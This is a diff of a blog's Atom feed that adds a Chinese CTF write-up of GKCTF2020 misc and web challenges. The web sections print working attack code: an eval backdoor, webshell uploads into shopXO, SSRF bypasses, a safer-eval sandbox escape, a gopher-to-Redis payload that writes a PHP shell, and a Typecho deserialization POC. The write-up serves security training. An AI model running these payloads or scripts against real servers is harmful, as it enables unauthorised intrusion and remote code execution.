+&lt;h3 id=&#34;Sail-a-boat-down-the-river&#34;&gt;&lt;a href=&#34;#Sail-a-boat-down-the-river&#34; class=&#34;headerlink&#34; title=&#34;Sail a boat down the river&#34;&gt;&lt;/a&gt;Sail a boat down the river&lt;/h3&gt;&lt;p&gt;三解，三个hint，当时的题还是很绕的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050024187.png&#34; alt=&#34;image-20230405002442142&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;Hint:
+闪烁的光芒
+是一行不是一列
+加密方式很常见
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;根据提示在&lt;code&gt;118帧-130帧&lt;/code&gt;、&lt;code&gt;200帧-208帧&lt;/code&gt;、&lt;code&gt;320帧-334帧&lt;/code&gt;、&lt;code&gt;410帧-418帧&lt;/code&gt;刷卡器出现闪光，摩斯密码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-.-- .-- ---.. --.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;解出得yw8g&lt;/p&gt;
+&lt;p&gt;在15秒看到一张二维码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050032246.png&#34; alt=&#34;image-20230405003255656&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050035420.png&#34; alt=&#34;image-20230405003538176&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXR5Z3QwTm1fRzVmVGZWRmxneFZjclE=&#34;&gt;https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;输入上面得到的密码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050036502.png&#34; alt=&#34;image-20230405003637459&#34;&gt;&lt;/p&gt;
+&lt;p&gt;密钥解熟读，然后根据排序即可得到：&lt;code&gt;52693795149137&lt;/code&gt;解密得到GG0kc.tf&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050040420.png&#34; alt=&#34;image-20230405004030369&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;Overture&lt;/code&gt;打开得到flag&lt;/p&gt;
+&lt;h2 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&#34;CheckIN&#34;&gt;&lt;a href=&#34;#CheckIN&#34; class=&#34;headerlink&#34; title=&#34;CheckIN&#34;&gt;&lt;/a&gt;CheckIN&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;title&amp;gt;Check_In&amp;lt;/title&amp;gt;
+&amp;lt;?php 
+highlight_file(__FILE__);
+class ClassName
+&amp;#123;
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        &amp;#123;
+                $this-&amp;gt;code = @$this-&amp;gt;x()[&amp;#39;Ginkgo&amp;#39;];
+                $this-&amp;gt;decode = @base64_decode( $this-&amp;gt;code );
+                @Eval($this-&amp;gt;decode);
+        &amp;#125;
+
+        public function x()
+        &amp;#123;
+                return $_REQUEST;
+        &amp;#125;
+&amp;#125;
+new ClassName();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里可以看到，源码很简单，接受参数，base64解码后eval执行，先尝试phpinfo()&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050051333.png&#34; alt=&#34;image-20230405005151284&#34;&gt;&lt;/p&gt;
+&lt;p&gt;能够正常执行，但是看到在环境变量中过滤了很多函数&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050052378.png&#34; alt=&#34;image-20230405005239337&#34;&gt;&lt;/p&gt;
+&lt;p&gt;没有过滤eval函数，尝试构造木马用蚁剑连接后，发现不能正常运行命令，使用插件绕过&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050058842.png&#34; alt=&#34;image-20230405005812789&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;老八小超市儿&#34;&gt;&lt;a href=&#34;#老八小超市儿&#34; class=&#34;headerlink&#34; title=&#34;老八小超市儿&#34;&gt;&lt;/a&gt;老八小超市儿&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051506808.png&#34; alt=&#34;image-20230405150623656&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是shopXO电商系统，基于thinkphp开发的，去搜CVE&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4OTg1NzgwL2FydGljbGUvZGV0YWlscy8xMjIyMTgwOTE=&#34;&gt;(71条消息) shopxo 文件读取（CNVD-2021-15822）_xzhome的博客-CSDN博客&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;这里直接用poc读取跟目录下面的flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051513091.png&#34; alt=&#34;image-20230405151307037&#34;&gt;&lt;/p&gt;
+&lt;p&gt;提示flag在root下面尝试读取发现return 500估计是权限问题，看来还得找别的cve，看了下版本是1.8&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051508840.png&#34; alt=&#34;image-20230405150840800&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDk5NDAw&#34;&gt;渗透测试|shopxo后台全版本获取shell复现 - 腾讯云开发者社区-腾讯云 (tencent.com)&lt;/span&gt;这里看到需要先登录，尝试发现没有改默认密码&lt;/p&gt;
+&lt;p&gt;这里直接搜索主题&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051521200.png&#34; alt=&#34;image-20230405152129091&#34;&gt;&lt;/p&gt;
+&lt;p&gt;下载后添加一句话木马&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051534023.png&#34; alt=&#34;image-20230405153407978&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再上传回去&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051535230.png&#34; alt=&#34;image-20230405153555190&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里直接添加&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051541059.png&#34; alt=&#34;image-20230405154104996&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用蚂蚁剑连接上后确实访问不了这个root目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:\Users\陌路\AppData\Roaming\Typora\typora-user-images\image-20230405154225020.png&#34; alt=&#34;image-20230405154225020&#34;&gt;&lt;/p&gt;
+&lt;p&gt;看到根目录还有一个hint&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051543047.png&#34; alt=&#34;image-20230405154340012&#34;&gt;&lt;/p&gt;
+&lt;p&gt;又看到auto.sh&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051544829.png&#34; alt=&#34;image-20230405154429791&#34;&gt;&lt;/p&gt;
+&lt;p&gt;没60秒刷新一次，那修改一下这个脚本就可以了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051548419.png&#34; alt=&#34;image-20230405154814376&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后去读flag.hint就可以了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051549681.png&#34; alt=&#34;image-20230405154912635&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;cve版签到&#34;&gt;&lt;a href=&#34;#cve版签到&#34; class=&#34;headerlink&#34; title=&#34;cve版签到&#34;&gt;&lt;/a&gt;cve版签到&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051554551.png&#34; alt=&#34;image-20230405155402510&#34;&gt;&lt;/p&gt;
+&lt;p&gt;cve编号有了，看来简单复现一下就行[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS3kxMjI2L3AvMTQzMzIxMTAuaHRtbA==&#34;&gt;代码审计] CVE-2020-7066 漏洞复现 - Ky1226 - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;简答来说get_headers()会截断URL中空字符后的内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051558787.png&#34; alt=&#34;image-20230405155808748&#34;&gt;&lt;/p&gt;
+&lt;p&gt;点击后多了一个url&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051557371.png&#34; alt=&#34;image-20230405155759326&#34;&gt;&lt;/p&gt;
+&lt;p&gt;看起来是SSRF，通过%00截断然后访问本地ip&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608881.png&#34; alt=&#34;image-20230405160815831&#34;&gt;&lt;/p&gt;
+&lt;p&gt;要以123结尾&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608003.png&#34; alt=&#34;image-20230405160845950&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;EZ三剑客-EzNode&#34;&gt;&lt;a href=&#34;#EZ三剑客-EzNode&#34; class=&#34;headerlink&#34; title=&#34;EZ三剑客-EzNode&#34;&gt;&lt;/a&gt;EZ三剑客-EzNode&lt;/h3&gt;&lt;p&gt;看到首页&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051614492.png&#34; alt=&#34;image-20230405161417448&#34;&gt;&lt;/p&gt;
+&lt;p&gt;版本&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;&amp;#123;
+  &amp;quot;name&amp;quot;: &amp;quot;src&amp;quot;,
+  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
+  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
+  &amp;quot;license&amp;quot;: &amp;quot;MIT&amp;quot;,
+  &amp;quot;dependencies&amp;quot;: &amp;#123;
+    &amp;quot;body-parser&amp;quot;: &amp;quot;1.19.0&amp;quot;,
+    &amp;quot;express&amp;quot;: &amp;quot;4.17.1&amp;quot;,
+    &amp;quot;safer-eval&amp;quot;: &amp;quot;1.3.6&amp;quot;
+  &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;源码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;js&#34;&gt;const express = require(&amp;#39;express&amp;#39;);
+const bodyParser = require(&amp;#39;body-parser&amp;#39;);
+
+const saferEval = require(&amp;#39;safer-eval&amp;#39;); // 2019.7/WORKER1 找到一个很棒的库
+
+const fs = require(&amp;#39;fs&amp;#39;);
+
+const app = express();
+
+
+app.use(bodyParser.urlencoded(&amp;#123; extended: false &amp;#125;));
+app.use(bodyParser.json());
+
+// 2020.1/WORKER2 老板说为了后期方便优化
+app.use((req, res, next) =&amp;gt; &amp;#123;
+  if (req.path === &amp;#39;/eval&amp;#39;) &amp;#123;
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) &amp;#123;
+      delay = Math.max(delay, parseInt(req.query.delay));
+    &amp;#125;
+    const t = setTimeout(() =&amp;gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&amp;gt; &amp;#123;
+      clearTimeout(t);
+      console.log(&amp;#39;timeout&amp;#39;);
+      try &amp;#123;
+        res.send(&amp;#39;Timeout!&amp;#39;);
+      &amp;#125; catch (e) &amp;#123;
+
+      &amp;#125;
+    &amp;#125;, 1000);
+  &amp;#125; else &amp;#123;
+    next();
+  &amp;#125;
+&amp;#125;);
+
+app.post(&amp;#39;/eval&amp;#39;, function (req, res) &amp;#123;
+  let response = &amp;#39;&amp;#39;;
+  if (req.body.e) &amp;#123;
+    try &amp;#123;
+      response = saferEval(req.body.e);
+    &amp;#125; catch (e) &amp;#123;
+      response = &amp;#39;Wrong Wrong Wrong!!!!&amp;#39;;
+    &amp;#125;
+  &amp;#125;
+  res.send(String(response));
+&amp;#125;);
+
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get(&amp;#39;/source&amp;#39;, function (req, res) &amp;#123;
+  res.set(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/javascript;charset=utf-8&amp;#39;);
+  res.send(fs.readFileSync(&amp;#39;./index.js&amp;#39;));
+&amp;#125;);
+
+// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
+app.get(&amp;#39;/version&amp;#39;, function (req, res) &amp;#123;
+  res.set(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/json;charset=utf-8&amp;#39;);
+  res.send(fs.readFileSync(&amp;#39;./package.json&amp;#39;));
+&amp;#125;);
+
+app.get(&amp;#39;/&amp;#39;, function (req, res) &amp;#123;
+  res.set(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/html;charset=utf-8&amp;#39;);
+  res.send(fs.readFileSync(&amp;#39;./index.html&amp;#39;))
+&amp;#125;)
+
+app.listen(80, &amp;#39;0.0.0.0&amp;#39;, () =&amp;gt; &amp;#123;
+  console.log(&amp;#39;Start listening&amp;#39;)
+&amp;#125;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;后面的部分都在首页面给出了，题目的核心在两个eval路由上，先看第一个&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;js&#34;&gt;app.use((req, res, next) =&amp;gt; &amp;#123;
+  // 如果请求路径为 &amp;#39;/eval&amp;#39;
+  if (req.path === &amp;#39;/eval&amp;#39;) &amp;#123;
+    // 设置延迟时间为 60 秒
+    let delay = 60 * 1000;
+    console.log(delay);
+    // 如果请求参数中有 delay 参数，则将延迟时间设置为 delay 参数的值和当前延迟时间的最大值
+    if (Number.isInteger(parseInt(req.query.delay))) &amp;#123;
+      delay = Math.max(delay, parseInt(req.query.delay));
+    &amp;#125;
+    // 设置一个定时器，延迟时间到期后执行 next() 函数
+    const t = setTimeout(() =&amp;gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    // 如果延迟时间过长，设置一个 1 秒的定时器，到期后清除之前设置的定时器，并返回 &amp;#39;Timeout!&amp;#39; 字符串
+    setTimeout(() =&amp;gt; &amp;#123;
+      clearTimeout(t);
+      console.log(&amp;#39;timeout&amp;#39;);
+      try &amp;#123;
+        res.send(&amp;#39;Timeout!&amp;#39;);
+      &amp;#125; catch (e) &amp;#123;
+
+      &amp;#125;
+    &amp;#125;, 1000);
+  &amp;#125; else &amp;#123;
+    // 如果请求路径不为 &amp;#39;/eval&amp;#39;，则执行 next() 函数
+    next();
+  &amp;#125;
+&amp;#125;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;简答来说就是通过&lt;code&gt;/eval?delay=&lt;/code&gt;上传一个数字并和60000比较，大的赋值给delay&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;浏览器内部使用32位带符号的整数来储存推迟执行的时间这意味着setTimeout最多延迟2147483647秒（24.8天）。只要大于2147483647,就会发生溢出
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;根据版本找到一个cve&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NvbW1lbnRob2wvc2FmZXItZXZhbC9pc3N1ZXMvMTA=&#34;&gt;Breakout · Issue #10 · commenthol&amp;#x2F;safer-eval (github.com)&lt;/span&gt;，直接用就行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051628984.png&#34; alt=&#34;image-20230405162804912&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;EZ三剑客-EzWeb&#34;&gt;&lt;a href=&#34;#EZ三剑客-EzWeb&#34; class=&#34;headerlink&#34; title=&#34;EZ三剑客-EzWeb&#34;&gt;&lt;/a&gt;EZ三剑客-EzWeb&lt;/h3&gt;&lt;p&gt;看源码有一个get传参&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629938.png&#34; alt=&#34;image-20230405162919887&#34;&gt;&lt;/p&gt;
+&lt;p&gt;访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629926.png&#34; alt=&#34;image-20230405162928878&#34;&gt;&lt;/p&gt;
+&lt;p&gt;给了网卡信息，在前段输入www.baidu.com,可以访问到这个页面。又是一个ssrf&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051630056.png&#34; alt=&#34;image-20230405163052975&#34;&gt;&lt;/p&gt;
+&lt;p&gt;不让访问127.0.0.1但是可以使用真实ip&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051636213.png&#34; alt=&#34;image-20230405163646133&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试使用file读文件file协议被过滤了，尝试通过file:&amp;#x2F;或者file: &amp;#x2F;&amp;#x2F;去绕过&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051641155.png&#34; alt=&#34;image-20230405164131078&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+function curl($url)&amp;#123;  
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    echo curl_exec($ch);
+    curl_close($ch);
+&amp;#125;
+
+if(isset($_GET[&amp;#39;submit&amp;#39;]))&amp;#123;
+        $url = $_GET[&amp;#39;url&amp;#39;];
+        //echo $url.&amp;quot;\n&amp;quot;;
+        if(preg_match(&amp;#39;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&amp;#39;, $url,$match))
+        &amp;#123;
+            //var_dump($match);
+            die(&amp;#39;别这样&amp;#39;);
+        &amp;#125;
+        curl($url);
+&amp;#125;
+if(isset($_GET[&amp;#39;secret&amp;#39;]))&amp;#123;
+    system(&amp;#39;ifconfig&amp;#39;);
+&amp;#125;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;过滤了file:&amp;#x2F;&amp;#x2F;、dict、127.0.0.1、localhost，还能使用gopher协议和http协议&lt;/p&gt;
+&lt;p&gt;先使用http服务探测存活主机，这里用burp的探测会卡住，简单的用python判断&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
+import time
+
+url = &amp;quot;http://d3edfd3a-f06a-42ad-9bf4-fb994618272a.node4.buuoj.cn:81/index.php&amp;quot;
+for i in range(255):
+    getdata = &amp;quot;?url=http://10.244.80.&amp;quot;+str(i)+&amp;quot;&amp;amp;submit=%E6%8F%90%E4%BA%A4&amp;quot;
+    urs_l = url + getdata
+    # print(urs_l)
+    try:
+        re = requests.get(urs_l,timeout=1)
+        print(re)
+    except requests.exceptions.RequestException:
+        print(&amp;quot;失败   &amp;quot;+str(i))
+        pass
+
+    time.sleep(1)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720575.png&#34; alt=&#34;image-20230405172033524&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720183.png&#34; alt=&#34;image-20230405172015095&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着扫描端口，6379端口是开放的，有redis服务，gopher打ssrf，redis的未授权访问漏洞，这里贴一下网上找到的python2的脚本这里改一下用python3跑&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;# 导入 quote 函数
+from urllib.parse import quote
+
+# 定义协议、IP、端口、要写入的 PHP 代码、文件名、路径、密码、命令列表
+protocol = &amp;quot;gopher://&amp;quot;
+ip = &amp;quot;10.244.80.203&amp;quot;
+port = &amp;quot;6379&amp;quot;
+shell = &amp;quot;\n\n&amp;lt;?php system(\&amp;quot;cat /flag\&amp;quot;);?&amp;gt;\n\n&amp;quot;
+filename = &amp;quot;1.php&amp;quot;
+path = &amp;quot;/var/www/html&amp;quot;
+passwd = &amp;quot;&amp;quot;
+cmd = [&amp;quot;flushall&amp;quot;,  # 清空 Redis 数据库
+       &amp;quot;set 1 &amp;#123;&amp;#125;&amp;quot;.format(shell.replace(&amp;quot; &amp;quot;, &amp;quot;$&amp;#123;IFS&amp;#125;&amp;quot;)),  # 将 PHP 代码写入 Redis 中
+       &amp;quot;config set dir &amp;#123;&amp;#125;&amp;quot;.format(path),  # 设置 Redis 工作目录
+       &amp;quot;config set dbfilename &amp;#123;&amp;#125;&amp;quot;.format(filename),  # 设置 Redis 数据库文件名
+       &amp;quot;save&amp;quot;  # 将 Redis 数据库保存到磁盘中
+       ]
+
+# 如果设置了密码，将 AUTH 命令添加到命令列表中
+if passwd:
+    cmd.insert(0, &amp;quot;AUTH &amp;#123;&amp;#125;&amp;quot;.format(passwd))
+
+# 拼接 payload
+payload = protocol + ip + &amp;quot;:&amp;quot; + port + &amp;quot;/_&amp;quot;
+
+# 定义 redis_format 函数，将命令转换为 Redis 格式
+def redis_format(arr):
+    CRLF = &amp;quot;\r\n&amp;quot;
+    redis_arr = arr.split(&amp;quot; &amp;quot;)
+    cmd = &amp;quot;&amp;quot;
+    cmd += &amp;quot;*&amp;quot; + str(len(redis_arr))
+    for x in redis_arr:
+        cmd += CRLF + &amp;quot;$&amp;quot; + str(len((x.replace(&amp;quot;$&amp;#123;IFS&amp;#125;&amp;quot;, &amp;quot; &amp;quot;)))) + CRLF + x.replace(&amp;quot;$&amp;#123;IFS&amp;#125;&amp;quot;, &amp;quot; &amp;quot;)
+    cmd += CRLF
+    return cmd
+
+# 将每个命令转换为 Redis 格式，并拼接到 payload 中
+if __name__ == &amp;quot;__main__&amp;quot;:
+    for x in cmd:
+        payload += quote(redis_format(x))
+    print(payload)
+#gopher://10.244.80.203:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0A1.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;访问木马文件就能拿到flag&lt;/p&gt;
+&lt;h3 id=&#34;EZ三剑客-EzTypecho&#34;&gt;&lt;a href=&#34;#EZ三剑客-EzTypecho&#34; class=&#34;headerlink&#34; title=&#34;EZ三剑客-EzTypecho&#34;&gt;&lt;/a&gt;EZ三剑客-EzTypecho&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051750723.png&#34; alt=&#34;image-20230405175019643&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接去找Typecho的cve，看到是有反序列化漏洞的&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQyNC8jMHgwMQ==&#34;&gt;Typecho 前台 getshell 漏洞分析 (seebug.org)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;这个直接用网上的poc打就行&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+class Typecho_Request
+&amp;#123;
+    private $_params = array();
+    private $_filter = array();
+
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;_params[&amp;#39;screenName&amp;#39;] = &amp;#39;ls /&amp;#39;;
+        //$this-&amp;gt;_params[&amp;#39;screenName&amp;#39;] = -1;
+        $this-&amp;gt;_filter[0] = &amp;#39;system&amp;#39;;
+    &amp;#125;
+&amp;#125;
+
+class Typecho_Feed
+&amp;#123;
+    const RSS2 = &amp;#39;RSS 2.0&amp;#39;;
+    /** 定义ATOM 1.0类型 */
+    const ATOM1 = &amp;#39;ATOM 1.0&amp;#39;;
+    /** 定义RSS时间格式 */
+    const DATE_RFC822 = &amp;#39;r&amp;#39;;
+    /** 定义ATOM时间格式 */
+    const DATE_W3CDTF = &amp;#39;c&amp;#39;;
+    /** 定义行结束符 */
+    const EOL = &amp;quot;\n&amp;quot;;
+    private $_type;
+    private $_items = array();
+    public $dateFormat;
+
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;_type = self::RSS2;
+        $item[&amp;#39;link&amp;#39;] = &amp;#39;1&amp;#39;;
+        $item[&amp;#39;title&amp;#39;] = &amp;#39;2&amp;#39;;
+        $item[&amp;#39;date&amp;#39;] = 1507720298;
+        $item[&amp;#39;author&amp;#39;] = new Typecho_Request();
+        $item[&amp;#39;category&amp;#39;] = array(new Typecho_Request());
+
+        $this-&amp;gt;_items[0] = $item;
+    &amp;#125;
+&amp;#125;
+
+$x = new Typecho_Feed();
+$a = array(
+    &amp;#39;host&amp;#39; =&amp;gt; &amp;#39;localhost&amp;#39;,
+    &amp;#39;user&amp;#39; =&amp;gt; &amp;#39;xxxxxx&amp;#39;,
+    &amp;#39;charset&amp;#39; =&amp;gt; &amp;#39;utf8&amp;#39;,
+    &amp;#39;port&amp;#39; =&amp;gt; &amp;#39;3306&amp;#39;,
+    &amp;#39;database&amp;#39; =&amp;gt; &amp;#39;typecho&amp;#39;,
+    &amp;#39;adapter&amp;#39; =&amp;gt; $x,
+    &amp;#39;prefix&amp;#39; =&amp;gt; &amp;#39;typecho_&amp;#39;
+);
+echo urlencode(base64_encode(serialize($a)));
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+</content>
+        <category term="WP" scheme="https://blog.xcu.icu/categories/WP/" />
+        <category term="GKCTF2020" scheme="https://blog.xcu.icu/tags/GKCTF2020/" />
+        <updated>2023-04-04T16:00:00.000Z</updated>
+    </entry>
     <entry>
         <id>https://blog.xcu.icu/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/</id>
         <title>RMI浅记</title>
@@ -3901,43 +4532,5 @@ content=AAPD9waHAgc3lzdGVtKCdscycpOyA/Pg==
         <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
         <category term="文件包含" scheme="https://blog.xcu.icu/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" />
         <updated>2022-11-05T04:00:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://blog.xcu.icu/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/</id>
-        <title>php://filter过exit</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/"/>
-        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
-&lt;p&gt;谨以此篇记录一下 php://filter 在一些情况下的使用方法，主要是 php://filter 在 file_put_content 写文件时的一些方法，看到网上有很多师傅都有对这一块的文章，这里做一下记录和测试&lt;/p&gt;
-&lt;h2 id=&#34;什么是phpfilter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是phpfilter&#34;&gt;#&lt;/a&gt; 什么是 php://filter&lt;/h2&gt;
-&lt;p&gt;首先来看看官方文档中怎么解释这个伪协议&lt;/p&gt;
